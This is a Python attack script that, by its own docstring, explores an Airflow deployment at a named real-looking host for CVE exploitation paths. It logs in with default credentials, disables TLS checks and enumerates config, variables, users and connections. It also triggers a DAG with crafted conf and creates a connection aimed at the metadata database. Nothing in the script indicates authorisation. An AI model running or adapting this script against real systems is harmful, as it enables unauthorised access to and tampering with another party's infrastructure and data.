#!/usr/bin/env python3
"""Explore Airflow API endpoints for CVE exploitation paths"""
import json
import sys
import urllib3
import urllib.parse
urllib3.disable_warnings()

import requests

BASE = "https://airflow.pasarpolis.io"
s = requests.Session()
s.verify = False

# Get token
r = s.post(f"{BASE}/auth/token", json={"username":"airflow","password":"airflow"})
token = r.json()["access_token"]
s.headers["Authorization"] = f"Bearer {token}"

# 1. Check health endpoint
print("=== HEALTH ===")
try:
    r = s.get(f"{BASE}/api/v2/monitor/health")
    print(json.dumps(r.json(), indent=2))
except:
    print(f"Status: {r.status_code}")

# 2. Try to get OpenAPI spec at various paths
print("\n=== OPENAPI SPEC HUNT ===")
for path in ["/api/v2/openapi", "/openapi.json", "/api/v2/openapi.json",
             "/api/v2/ui/", "/docs", "/api/v1/openapi.json", "/redoc",
             "/api/v2/public/openapi.json"]:
    r = s.get(f"{BASE}{path}")
    print(f"{r.status_code:3d} {path} | content-type={r.headers.get('content-type','?')[:50]}")

# 3. Test connection endpoint
print("\n=== TEST CONNECTION (SSH) ===")
try:
    r = s.post(f"{BASE}/api/v2/connections/test", json={
        "connection_id": "test_ssh_meta",
        "conn_type": "ssh",
        "host": "localhost",
        "login": "airflow",
        "port": 22
    })
    print(f"Status: {r.status_code}")
    print(r.text[:500])
except Exception as e:
    print(f"Error: {e}")

# 4. Try DAG trigger with crafted conf
print("\n=== TRIGGER DAG WITH CONF ===")
try:
    r = s.post(f"{BASE}/api/v2/dags/agency_bronze_envelope/dagRuns", json={
        "note": "test",
        "conf": {"test": "probe"}
    })
    print(f"Status: {r.status_code}")
    print(r.text[:500])
except Exception as e:
    print(f"Error: {e}")

# 5. List all available endpoints by probing common API paths
print("\n=== ENDPOINT PROBE ===")
endpoints = [
    "/api/v2/dags", "/api/v2/connections", "/api/v2/variables",
    "/api/v2/pools", "/api/v2/plugins", "/api/v2/providers",
    "/api/v2/config", "/api/v2/dagSources", "/api/v2/dagWarnings",
    "/api/v2/dagStats", "/api/v2/eventLogs", "/api/v2/importErrors",
    "/api/v2/xcomEntries", "/api/v2/assets", "/api/v2/backfills",
    "/api/v2/monitor/health", "/api/v2/dagBundles", "/api/v2/roles",
    "/api/v2/permissions", "/api/v2/users", "/api/v2/dagParsing",
    "/auth/login", "/auth/token"
]
for ep in endpoints:
    try:
        r = s.get(f"{BASE}{ep}")
        ct = r.headers.get('content-type','?')[:30]
        print(f"{r.status_code:3d} {ep:45s} | {ct} | {r.text[:80]}")
    except:
        print(f"ERR {ep}")

# 6. Check if we can create a connection to the metadata DB
print("\n=== CREATE TEST CONNECTION ===")
try:
    r = s.post(f"{BASE}/api/v2/connections", json={
        "connection_id": "meta_test_probe",
        "conn_type": "mysql",
        "host": "localhost",
        "schema": "airflow",
        "login": "airflow",
        "password": "airflow",
        "port": 3306
    })
    print(f"Create connection: {r.status_code}")
    print(r.text[:500])
except Exception as e:
    print(f"Error: {e}")

# 7. Try to get DAG source via different method
print("\n=== DAG BUNDLES ===")
try:
    r = s.get(f"{BASE}/api/v2/dagBundles")
    print(f"Status: {r.status_code}")
    print(r.text[:500])
except Exception as e:
    print(f"Error: {e}")
